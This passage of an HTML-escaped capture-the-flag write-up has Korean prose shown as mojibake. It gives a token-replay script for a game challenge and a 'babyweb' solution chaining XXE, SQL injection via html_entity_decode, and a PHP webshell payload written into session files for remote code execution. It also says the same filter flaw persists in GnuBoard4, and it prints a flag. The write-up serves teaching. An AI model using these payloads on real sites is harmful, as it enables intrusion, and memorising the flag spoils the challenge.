&lt;/p&gt;&lt;h3 id=&quot;e02f1131-7194-46d8-918b-3448b32ef06c&quot; class=&quot;&quot;&gt;4&lt;strong&gt;. Javascript Codingë¥¼ í†µí•˜ì—¬ í”Œë˜ê·¸ íšë“í•˜ê¸°&lt;/strong&gt;&lt;/h3&gt;&lt;ul id=&quot;44e3c732-28b5-4603-a9cc-c0d1cbebbffe&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ì´ë²ˆì—ëŠ” ê²Œì„ í•µìœ¼ë¡œ ë¬¸ì œí’€ì´ ëŒ€ì‹  Javascript ì½”ë”©ì„ í†µí•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“ í•˜ì.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;65bffca7-872a-4141-a2cc-6a58e5050cfa&quot; class=&quot;code&quot;&gt;&lt;code&gt;$.ajaxSetup({async: false});  

var url = &amp;quot;check.php&amp;quot;;
var data = {kills: 15, token: &amp;quot;start&amp;quot;};
token = 1;

$.post(url, data, function(response) {
    token = response;
    
});


for(var i = 0;  i &amp;lt;= 35;  i++) {
    var data = {kills: 15, token: token};

    
    $.post(url, data, function(response) {
        token = response;
    });
};

var data = {check: &amp;quot;clear&amp;quot;};
$.post(url, data, function(response) {
    eval(response);
});&lt;/code&gt;&lt;/pre&gt;&lt;ul id=&quot;36150e58-8cdc-4d1e-b23f-07f0614f8066&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Game ë¡œì§ì„ íŒŒì•…í–ˆë‹¤ë©´ ìœ„ì™€ ê°™ì´ Javascript Codeì˜ Ajaxë¥¼ í†µí•˜ì—¬ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆë‹¤.
ë¡œì§ì˜ ì›ë¦¬ëŠ” Killsìˆ˜ê°€ 15ë¥¼ ì´ˆê³¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë¨¼ì € Tokenê°’ì— &amp;quot;&lt;strong&gt;start&lt;/strong&gt;&amp;quot;ë¥¼ ë³´ë‚´ì–´ ë‘ ë²ˆì§¸ ì´í›„ë¶€í„° ì‘ë‹µë˜ì–´ ì˜¨ í† í°ì„ ê°€ì§€ê³  ë‹¤ì‹œ 35ë²ˆ ë°˜ë³µì„ í†µí•˜ì—¬ í† í°ì„ ì „ì†¡í•˜ê³ , ë§ˆì§€ë§‰ìœ¼ë¡œ ê³µê²©ì(ì™¸ê³„ì¸)ë¥¼ ì „ë¶€ ë¬¼ë¦¬ì³¤ë‹¤ëŠ” &amp;quot;&lt;strong&gt;check=clear&lt;/strong&gt;&amp;quot; ê°’ì„ ì „ì†¡í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•˜ëŠ” ë¡œì§ì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;c59b32eb-b8f4-4bb3-a9f1-c27c0391bcf7&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;24999b12-d09b-4ac3-a104-fe5400951d02&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/clears.gif&quot;&gt;&lt;img style=&quot;width:1520px&quot; src=&quot;/assets/bob/clears.gif&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;a9987a55-8ef2-4d49-96c8-6158c600e8b3&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;d9351912-9bf1-49d9-86ad-5c7e12bfa22e&quot; class=&quot;to-do-list&quot;&gt;&lt;li&gt;&lt;div class=&quot;checkbox checkbox-on&quot;&gt;&lt;/div&gt; &lt;span class=&quot;to-do-children-checked&quot;&gt;Flag is bob{b0b_!s_fun_g@me_r3tr0}&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;bb368f1e-d29e-4366-af3f-0bb81263f56c&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;ul id=&quot;f6e94f56-b320-4f4d-ada2-a666bad315b4&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ëŒ€íšŒ ëë‚˜ê³  Access.logë¥¼ í™•ì¸í•´ë³¸ ê²°ê³¼... &amp;quot;&lt;strong&gt;105961&lt;/strong&gt;&amp;quot; Lineì´ ìŒ“ì˜€ë„¤ìš”. 3ì¼ ë§Œì— 10ë§Œ ì¤„ì´ ìŒ“ì¸ ê±¸ ë³´ë‹ˆ ì˜¤ê¸°ë¡œ ê²Œì„ í”Œë ˆì´ì–´ í•˜ì—¬ í”Œë˜ê·¸ë¥¼ íšë“í•œ ë¶„ë„ ê³„ì‹¤ ê±°ë¼ ì˜ˆìƒë©ë‹ˆë‹¤... (ì¡´ê²½ìŠ¤ëŸ½ìŠµë‹ˆë‹¤...)&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;bff0159b-3a85-4b72-bad5-584fca07b41d&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;80a3edb1-a805-409f-abed-16c4f235d5ae&quot; class=&quot;&quot;&gt;babyweb&lt;/h2&gt;&lt;hr id=&quot;b1d26bbe-08eb-4296-955c-cb6a2b65a306&quot;/&gt;&lt;figure id=&quot;cab02421-f8e3-466f-8470-25fbc6401355&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob921.png&quot;&gt;&lt;img style=&quot;width:710px&quot; src=&quot;/assets/bob/bob921.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;31531414-936e-4193-9088-b5b05e62909f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;a6b9586d-8722-4939-ac6b-b5fa1d06fd00&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;/readFlag | RCE&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;097de8b7-3466-40e2-9685-4e514745e639&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;f5b79677-4734-4b00-a980-c51817e651cd&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;6d4461de-1d27-48e1-91bf-9f7bdef479a5&quot; class=&quot;&quot;&gt;ë¬¸ì œ ì„¤ëª…ì— /readFlag ë¼ê³  ë˜ì–´ ìˆìœ¼ë¯€ë¡œ RCEë¥¼ í•´ì•¼í•˜ëŠ” ë¬¸ì œì´ë‹¤.&lt;/p&gt;&lt;p id=&quot;296b2ef9-5f40-413c-b51e-30da50b7bd41&quot; class=&quot;&quot;&gt;ë¬¸ì œ í˜ì´ì§€ì— ì ‘ì†í•˜ë©´ XML ì‚¬ìš©í•˜ëŠ” í˜ì´ì§€ê°€ ë‚˜ì˜¨ë‹¤.&lt;/p&gt;&lt;p id=&quot;83c00fa4-89a0-4f8f-9f41-0a1243eeef23&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;ace4a06c-2403-4d2f-8958-479d93bea07a&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob922.png&quot;&gt;&lt;img style=&quot;width:1056px&quot; src=&quot;/assets/bob/bob922.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;1429d01f-54d0-4c07-b7f3-75e2445459b8&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;e3200ab6-067a-47fc-90ef-bbb55df8622f&quot; class=&quot;&quot;&gt;XXE ê³µê²©ì„ í†µí•´ ì†ŒìŠ¤ í˜ì´ì§€ë¥¼ í•˜ë‚˜í•˜ë‚˜ì”© ë³¸ë‹¤.&lt;/p&gt;&lt;p id=&quot;27be1a0f-e596-4aa2-8026-b24342cb9bd3&quot; class=&quot;&quot;&gt;ë¨¼ì € &amp;quot;join.php&amp;quot;ë¥¼ ë³´ë©´ htmlentitiesë¥¼ í†µí•´ ë¬´ì–¸ê°€ë¥¼ ë§‰ìœ¼ë ¤í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;pre id=&quot;cd3dbb48-3bd1-431c-b128-6766cdd30937&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;?php
	$id = mysqli_real_escape_string($dbc, htmlentities($_POST[&amp;#x27;id&amp;#x27;], ENT_QUOTES, &amp;quot;UTF-8&amp;quot;));
	$pw = hash(&amp;#x27;sha256&amp;#x27;, $_POST[&amp;#x27;pw&amp;#x27;]);
	$nick = mysqli_real_escape_string($dbc, htmlentities($_POST[&amp;#x27;nick&amp;#x27;], ENT_QUOTES, &amp;quot;UTF-8&amp;quot;));

	$query = &amp;quot;INSERT INTO users VALUES (NULL,&amp;#x27;{$id}&amp;#x27;, &amp;#x27;{$pw}&amp;#x27;, &amp;#x27;{$nick}&amp;#x27;, &amp;#x27;&amp;#x27;);&amp;quot;;

	$result = mysqli_query($dbc, $query);

	if($result)
		echo &amp;#x27;&amp;lt;script&amp;gt;location.href=&amp;quot;./&amp;quot;;&amp;lt;/script&amp;gt;&amp;#x27;;
	else
		echo &amp;#x27;&amp;lt;script&amp;gt;alert(&amp;quot;Error&amp;quot;); history.go(-1);&amp;lt;/script&amp;gt;&amp;#x27;;
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;eb32d74a-740a-46c0-91ff-9b8c2dfda527&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;490812e1-078d-4fc8-b1bd-bca685fdc066&quot; class=&quot;&quot;&gt;ê·¸ë¦¬ê³  login.phpë¥¼ ë³´ë©´ $_SESSION ë³€ìˆ˜ì— ë¡œê·¸ì¸í•œ ì•„ì´ë””ì™€ ë‹‰ë„¤ì„ì„ ë„£ëŠ”ë‹¤.&lt;/p&gt;&lt;pre id=&quot;35a988d8-8f50-4aca-8431-bb6b7af5486b&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;?php
	$id = mysqli_real_escape_string($dbc, $_POST[&amp;#x27;id&amp;#x27;]);
	$pw = hash(&amp;#x27;sha256&amp;#x27;, $_POST[&amp;#x27;pw&amp;#x27;]);

	$query = &amp;quot;SELECT * FROM users WHERE userid=&amp;#x27;{$id}&amp;#x27; AND password=&amp;#x27;{$pw}&amp;#x27;&amp;quot;;

	$result = mysqli_query($dbc, $query);
	$row = mysqli_fetch_array($result);

	if($id===$row[&amp;#x27;userid&amp;#x27;] &amp;amp;&amp;amp; $pw===$row[&amp;#x27;password&amp;#x27;]){

		$_SESSION[&amp;#x27;nickname&amp;#x27;] = $row[&amp;#x27;nickname&amp;#x27;];
		$_SESSION[&amp;#x27;userid&amp;#x27;] = $row[&amp;#x27;userid&amp;#x27;];
		echo &amp;#x27;&amp;lt;script&amp;gt;location.href=&amp;quot;./&amp;quot;;&amp;lt;/script&amp;gt;&amp;#x27;;
	}else
		echo &amp;#x27;&amp;lt;script&amp;gt;alert(&amp;quot;Error&amp;quot;); history.go(-1);&amp;lt;/script&amp;gt;&amp;#x27;;
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;68948b06-0d5a-42c0-9384-2e73cde7fbc4&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;3f11a340-3522-437d-890d-32fec7759a32&quot; class=&quot;&quot;&gt;RCEë¥¼ ìœ„í•´ì„œëŠ” LFI ì·¨ì•½ì ì´ í•„ìš”í•˜ë‹¤. LFIë¥¼ í•˜ê¸° ìœ„í•´ì„  íŒŒì¼ ì—…ë¡œë“œ ê¸°ëŠ¥ì„ ì´ìš©í•˜ê±°ë‚˜ íŒŒì¼ì— ì›í•˜ëŠ” ê²ƒì„ ì“¸ ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ìˆìœ¼ë©´ ëœë‹¤.&lt;/p&gt;&lt;p id=&quot;6d9783a3-65ab-41f8-9893-bdd54003dc43&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;9faef9d5-7f4b-4c64-9adf-706b1b21b110&quot; class=&quot;&quot;&gt;í•˜ì§€ë§Œ &amp;quot;join.php&amp;quot;ì—ì„œ htmlentitiesë¥¼ ì´ìš©í•´ ì„¸ì…˜ íŒŒì¼ì— php íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ë„ë¡ ì œí•œí•˜ì˜€ë‹¤.&lt;/p&gt;&lt;p id=&quot;e1a4ffff-c090-49a3-b20f-8841187d63dd&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;0ff1fd2e-42bd-45d5-942e-a385feea3cdc&quot; class=&quot;&quot;&gt;ê·¸ ë‹¤ìŒ &amp;quot;getxmldata.php&amp;quot;ë¥¼ ë³´ë©´ mysqli_real_escape_stringë¥¼ í†µí•´ì„œ SQLIë¥¼ ë§‰ì€ ê²ƒ ì²˜ëŸ¼ ë³´ì´ì§€ë§Œ ì‹¤ì œë¡œëŠ” ë§‰íˆì§€ ì•Šì•˜ë‹¤.&lt;/p&gt;&lt;pre id=&quot;5e6ff35e-40d9-43d4-ae94-863d3ddaa4b7&quot; class=&quot;code&quot;&gt;&lt;code&gt;&amp;lt;?php

function xss_filter($data) 
{ 
    if(empty($data)) 
        return $data; 
         
    if(is_array($data)) 
    { 
        foreach($data as $key =&amp;gt; $value) 
        { 
            $data[$key] = xss_filter($value); 
        } 
         
        return $data; 
    } 
     
    $data = str_replace(array(&amp;#x27;&amp;amp;amp;&amp;#x27;,&amp;#x27;&amp;amp;lt;&amp;#x27;,&amp;#x27;&amp;amp;gt;&amp;#x27;), array(&amp;#x27;&amp;amp;amp;amp;&amp;#x27;,&amp;#x27;&amp;amp;amp;lt;&amp;#x27;,&amp;#x27;&amp;amp;amp;gt;&amp;#x27;), $data); 
    $data = preg_replace(&amp;#x27;/(&amp;amp;#*\\w+)[\\x00-\\x20]+;/&amp;#x27;, &amp;#x27;$1;&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;/(&amp;amp;#x*[0-9A-F]+);*/i&amp;#x27;, &amp;#x27;$1;&amp;#x27;, $data); 

    if (function_exists(&amp;quot;html_entity_decode&amp;quot;))
    {
        $data = html_entity_decode($data); 
    }
    else
    {
        $trans_tbl = get_html_translation_table(HTML_ENTITIES);
        $trans_tbl = array_flip($trans_tbl);
        $data = strtr($data, $trans_tbl);
    }

    $data = preg_replace(&amp;#x27;#(&amp;lt;[^&amp;gt;]+?[\\x00-\\x20&amp;quot;\\&amp;#x27;])(?:on|xmlns)[^&amp;gt;]*+&amp;gt;#i&amp;#x27;, &amp;#x27;$1&amp;gt;&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#([a-z]*)[\\x00-\\x20]*=[\\x00-\\x20]*([`\\&amp;#x27;&amp;quot;]*)[\\x00-\\x20]*j[\\x00-\\x20]*a[\\x00-\\x20]*v[\\x00-\\x20]*a[\\x00-\\x20]*s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:#i&amp;#x27;, &amp;#x27;$1=$2nojavascript...&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#([a-z]*)[\\x00-\\x20]*=([\\&amp;#x27;&amp;quot;]*)[\\x00-\\x20]*v[\\x00-\\x20]*b[\\x00-\\x20]*s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:#i&amp;#x27;, &amp;#x27;$1=$2novbscript...&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#([a-z]*)[\\x00-\\x20]*=([\\&amp;#x27;&amp;quot;]*)[\\x00-\\x20]*-moz-binding[\\x00-\\x20]*:#&amp;#x27;, &amp;#x27;$1=$2nomozbinding...&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#(&amp;lt;[^&amp;gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\&amp;#x27;&amp;quot;]*.*?expression[\\x00-\\x20]*\\([^&amp;gt;]*+&amp;gt;#i&amp;#x27;, &amp;#x27;$1&amp;gt;&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#(&amp;lt;[^&amp;gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\&amp;#x27;&amp;quot;]*.*?behaviour[\\x00-\\x20]*\\([^&amp;gt;]*+&amp;gt;#i&amp;#x27;, &amp;#x27;$1&amp;gt;&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#(&amp;lt;[^&amp;gt;]+?)style[\\x00-\\x20]*=[\\x00-\\x20]*[`\\&amp;#x27;&amp;quot;]*.*?s[\\x00-\\x20]*c[\\x00-\\x20]*r[\\x00-\\x20]*i[\\x00-\\x20]*p[\\x00-\\x20]*t[\\x00-\\x20]*:*[^&amp;gt;]*+&amp;gt;#i&amp;#x27;, &amp;#x27;$1&amp;gt;&amp;#x27;, $data); 
    $data = preg_replace(&amp;#x27;#&amp;lt;/*\\w+:\\w[^&amp;gt;]*+&amp;gt;#i&amp;#x27;, &amp;#x27;&amp;#x27;, $data); 

    do 
    { 
        $old_data = $data; 
        $data = preg_replace(&amp;#x27;#&amp;lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&amp;gt;]*+&amp;gt;#i&amp;#x27;, &amp;#x27;&amp;#x27;, $data); 
    } 
    while ($old_data !== $data); 
     
    return $data; 
}

.......

$xmldata = xss_filter(mysqli_real_escape_string($dbc, $data));
$query = &amp;#x27;update users set xmldata=&amp;quot;&amp;#x27;.$xmldata.&amp;#x27;&amp;quot; where userid=&amp;quot;&amp;#x27;.mysqli_real_escape_string($dbc, $_SESSION[&amp;#x27;userid&amp;#x27;]).&amp;#x27;&amp;quot;;&amp;#x27;;
$res = mysqli_query($dbc, $query);
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;7e647a95-c5f9-4cbf-8ae1-1655b2848c84&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;3abaaa5b-f13f-46ec-99d8-b51601216e0c&quot; class=&quot;&quot;&gt;RCEë¥¼ ìœ„í•´ í•´ë‹¹ ë¬¸ì œì—ì„œ ì‚¬ìš©í•´ì•¼í•  ê²ƒì€ &amp;quot;/var/lib/php/sessions/&amp;quot; ê²½ë¡œì— ìˆëŠ” PHP ì„¸ì…˜ íŒŒì¼ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒ ë°–ì—ëŠ” ì—†ìœ¼ë¯€ë¡œ ë´ì•¼í•  ê²ƒì€ nicknameê³¼ useridì— PHP ì½”ë“œë¥¼ ë„£ì„ ìˆ˜ ìˆê²Œ SQLI ì¸ì ì…˜ì„ ìƒê°í•  ìˆ˜ ë°–ì— ì—†ë‹¤.&lt;/p&gt;&lt;p id=&quot;feadcc0d-d413-4d33-b365-8f0571a0a415&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;6b171588-97d0-4c7f-85a1-79493d0c4db5&quot; class=&quot;&quot;&gt;mysqli_real_escape_string í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ SQLI ì·¨ì•½ì ì„ ë§‰ì„ ìˆ˜ ìˆì§€ë§Œ í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œë’¤ì— xss_filter í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆê¸° ë•Œë¬¸ì— SQLI ì·¨ì•½ì ì´ ì¼ì–´ë‚  ê³³ì€ ì—¬ê¸°ë°–ì— ì—†ë‹¤.&lt;/p&gt;&lt;pre id=&quot;15ca7dce-852a-45c9-98b5-977068100df5&quot; class=&quot;code&quot;&gt;&lt;code&gt;$xmldata = xss_filter(mysqli_real_escape_string($dbc, $data));
$query = &amp;#x27;update users set xmldata=&amp;quot;&amp;#x27;.$xmldata.&amp;#x27;&amp;quot; where userid=&amp;quot;&amp;#x27;.mysqli_real_escape_string($dbc, $_SESSION[&amp;#x27;userid&amp;#x27;]).&amp;#x27;&amp;quot;;&amp;#x27;;
$res = mysqli_query($dbc, $query);
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;0a165e4b-bd46-42e6-bc80-b16fe397c01c&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;8340a598-0838-4a37-956c-9f48778f660e&quot; class=&quot;&quot;&gt;ê·¸ í›„ xss_filterë¥¼ ìì„¸íˆ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;pre id=&quot;e84a01b8-0ea5-4967-b2fd-8ed970c01c50&quot; class=&quot;code&quot;&gt;&lt;code&gt;   if (function_exists(&amp;quot;html_entity_decode&amp;quot;))
    {
        $data = html_entity_decode($data); 
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;a6d05afd-bf53-4269-99b1-752d8c144ddd&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;0abd4c58-7857-4a44-b823-03798951b135&quot; class=&quot;&quot;&gt;xssë¥¼ ë°©ì–´í•˜ê¸° ìœ„í•´ì„œ html_entity_decodeí•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ”ë° ì—¬ê¸°ì—ì„œ ë¬¸ì œê°€ ë°œìƒí•œë‹¤.&lt;/p&gt;&lt;p id=&quot;5ccfdb5d-1b7d-42ce-aaa3-3fddfba60efa&quot; class=&quot;&quot;&gt;ë§Œì•½ aaaa&amp;quot;bbbb ë¥¼ ì‚¬ìš©í•œë‹¤ë©´ ì–´ë–»ê²Œ ë ê¹Œ?&lt;/p&gt;&lt;p id=&quot;e7eebefd-9ddb-4ddf-a63e-d92ddbd15960&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;34c9c119-6cac-432d-80a8-ffff9df97f5f&quot; class=&quot;&quot;&gt;ìœ„ ë°ì´í„°ê°€ html_entity_decodeë¥¼ ê±°ì¹˜ë©´ ì•„ë˜ì™€ ê°™ì´ ë³€í™˜ëœë‹¤.&lt;/p&gt;&lt;pre id=&quot;99d5c75c-c138-4039-a01f-594e6c0ff092&quot; class=&quot;code&quot;&gt;&lt;code&gt;aaaa&amp;quot;bbbb
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;8d357bbf-2abe-43c5-bd6b-6834df92a5df&quot; class=&quot;&quot;&gt;ë”°ë¼ì„œ ìš°ë¦¬ëŠ” quotë¬¸ìë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê³  update ë¬¸ì—ì„œ SQLIê°€ ë°œìƒí•˜ê²Œ í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;h3 id=&quot;f230690e-3cb1-4fed-b72b-101ade3db733&quot; class=&quot;&quot;&gt;ê³µê²© ì½”ë“œ&lt;/h3&gt;&lt;pre id=&quot;0f458647-ce8e-4b73-acaf-d7ab399ebfa0&quot; class=&quot;code&quot;&gt;&lt;code&gt;aaaa&amp;amp;quot;, nickname=&amp;amp;quot;&amp;lt;?php system($_GET[x]);
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;db9ed796-eae9-4c29-ae83-20756799d52c&quot; class=&quot;&quot;&gt;ë³€í™˜ëœ ê³µê²© ì½”ë“œ&lt;/h3&gt;&lt;pre id=&quot;527e62c7-13bd-4746-87df-9bb3ba0eb303&quot; class=&quot;code&quot;&gt;&lt;code&gt;aaaa&amp;quot;, nickname=&amp;quot;&amp;lt;?php system($_GET[x]);
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;8d5f9700-6a2d-4795-b0ec-5ae0f07ef60f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;578a0988-5d20-444b-afda-438dcfadd224&quot; class=&quot;&quot;&gt;ì‚¬ì‹¤ ì´ë ‡ê²Œë§Œ ë³´ë©´ ì•„ì£¼ ê°„ë‹¨í•˜ê³  ì‰¬ìš´ ë¬¸ì œì´ì§€ë§Œ, ì´ ë¬¸ì œë¥¼ ë‚´ê²Œëœ ë°°ê²½ì´ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;bc61b24e-18a2-408b-a96a-1312dc1d1be4&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;589602d4-7752-43d7-a575-e7366805355c&quot; class=&quot;&quot;&gt;xss_filter í•¨ìˆ˜ëŠ” ê·¸ëˆ„ë³´ë“œ4ì—ì„œ ì‚¬ìš©ë˜ëŠ” &amp;quot;xss_clean&amp;quot; í•¨ìˆ˜ ì´ê³  ì œë¡œë°ì´ ì·¨ì•½ì ì´ì˜€ë‹¤. ì§€ê¸ˆì€ ê·¸ëˆ„ë³´ë“œ5ê°€ ë°°í¬ë˜ê³  ìˆì–´ì„œ ë¬¸ì œëŠ” ì—†ì§€ë§Œ ì•„ì§ë„ ê·¸ëˆ„ë³´ë“œ4 ë°°í¬ë³¸ ì—ì„œëŠ” ì œë¡œë°ì´ ì·¨ì•½ì ìœ¼ë¡œ ë‚¨ì•„ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;41959e0e-4de1-46f9-a0a2-57fdc6dc474b&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;a1e860d5-cc96-44e6-b5a9-32be99d9a781&quot; class=&quot;&quot;&gt;ê·¸ëˆ„ë³´ë“œ4ì—ì„œëŠ” &amp;quot;common.php&amp;quot;ì—ì„œ mysqli_real_escape_string ëŒ€ìš©ìœ¼ë¡œ addslashes í•¨ìˆ˜ë¥¼ ì´ìš©í•´ ì„œë²„ë¡œ ì˜¤ëŠ” ë³€ìˆ˜ì— ëŒ€í•´ ì „ì²´ì ìœ¼ë¡œ SQLIë¥¼ ë°©ì–´í•˜ê³  &amp;quot;extract($_GET);&amp;quot;, &amp;quot;extract($_POST);&amp;quot;ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë²„ì— ì˜¤ëŠ” ë³€ìˆ˜ë¥¼ ê·¸ëŒ€ë¡œ PHP ë³€ìˆ˜ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;pre id=&quot;f1dd110e-01b5-4c15-ab98-1d1c49f3926d&quot; class=&quot;code&quot;&gt;&lt;code&gt;if( !get_magic_quotes_gpc() )
{
	if( is_array($_GET) )
	{
		while( list($k, $v) = each($_GET) )
		{
			if( is_array($_GET[$k]) )
			{
				while( list($k2, $v2) = each($_GET[$k]) )
				{
					$_GET[$k][$k2] = addslashes($v2);
				}
				@reset($_GET[$k]);
			}
			else
			{
				$_GET[$k] = addslashes($v);
			}
		}
		@reset($_GET);
	}

same $_POST ...

same $_COOKIE ...
}
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;8aade814-2241-4462-9f14-442e77285895&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;c09bce7c-6014-4214-8f01-0c62fdefee2b&quot; class=&quot;&quot;&gt;ê·¸ë˜ì„œ ì•„ë˜ì™€ ê°™ì´ ì‚¬ìš©í•˜ë©´ ì·¨ì•½ì ì„ ë°œê²¬í•˜ê¸° í˜ë“¤ë‹¤. ì–¸ëœ» ë³´ë©´ ê²Œì‹œíŒì—ì„œ xssë¥¼ ë°©ì–´í•˜ëŠ” ê²ƒ ê°™ì§€ë§Œ xss_clean í•¨ìˆ˜ ë•Œë¬¸ì— SQLI ì·¨ì•½ì ì´ ì¼ì–´ë‚œë‹¤.&lt;/p&gt;&lt;pre id=&quot;86091e24-5504-4ef5-b96c-3a4994c216f6&quot; class=&quot;code&quot;&gt;&lt;code&gt;$query = &amp;quot;update board set title=&amp;#x27;$title&amp;#x27;, body=&amp;#x27;&amp;quot;.xss_clean($body).&amp;quot;&amp;#x27;, &amp;#x27;$userid&amp;#x27; ...... &amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;19858f94-a033-410c-baa0-55cd8c8c6067&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;9b46f025-4ade-4076-b3d3-543f86de1357&quot; class=&quot;&quot;&gt;babyweb ë¬¸ì œë¥¼ ë‚´ë©´ì„œ ì·¨ì•½ì ì„ ì‰½ê²Œ ì•Œì•„ë³¼ ìˆ˜ ìˆë„ë¡ login.php, join.php ë“±ì—ì„œëŠ” ì‘ì€ ë”°ì˜´í‘œë¥¼ ì‚¬ìš©í–ˆê³ , getxmldata.phpì—ì„œëŠ” í° ë”°ì˜´í‘œë¥¼ ì‚¬ìš©í–ˆìœ¼ë©°, SQLI ì·¨ì•½ì ì„ ì§ê´€ì ìœ¼ë¡œ ì•Œì•„ë³¼ ìˆ˜ ìˆë„ë¡ mysqli_real_escape_stringì„ ì „ì—­ì ìœ¼ë¡œ ì‚¬ìš©í•˜ì§€ ì•Šê³  xss_filterí•¨ìˆ˜ì™€ ê°™ì´ ë³´ì´ê²Œ ì‚¬ìš©í•˜ì˜€ë‹¤.&lt;/p&gt;&lt;pre id=&quot;56bbc74d-0f14-4fbc-857e-f2840cccb37b&quot; class=&quot;code&quot;&gt;&lt;code&gt;$query = xss_filter(mysqli_real_escape_string(ë°ì´í„°));&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;aae9e3ee-3c0c-4baf-84fc-0b3ce4140773&quot; class=&quot;&quot;&gt;CatDog&lt;/h2&gt;&lt;hr 